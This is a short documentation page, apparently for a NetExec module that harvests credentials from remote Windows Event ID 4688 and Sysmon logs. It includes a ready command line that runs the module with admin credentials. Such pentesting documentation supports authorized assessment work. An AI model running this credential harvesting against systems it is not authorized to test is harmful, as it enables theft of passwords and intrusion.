# 🆕 Dump Event Log Creds(4688)

### Parses Windows Event ID 4688 and Sysmon Logs

{% hint style="warning" %}
You need at least local admin privilege on the remote target
{% endhint %}

This module parses Windows logs for Event ID 4688, as well as sysmon logs for Event ID 1 to extract credentials from CMD and PowerShell commands. E.g. "net user username password /add":

```bash
nxc smb <ip> -u username -p password -M eventlog_creds
```

<figure><img src="https://github.com/user-attachments/assets/ea7b71d4-4ecb-4662-8ad8-d3a811ab5d42" alt=""><figcaption><p>Enumerate Event Logs</p></figcaption></figure>
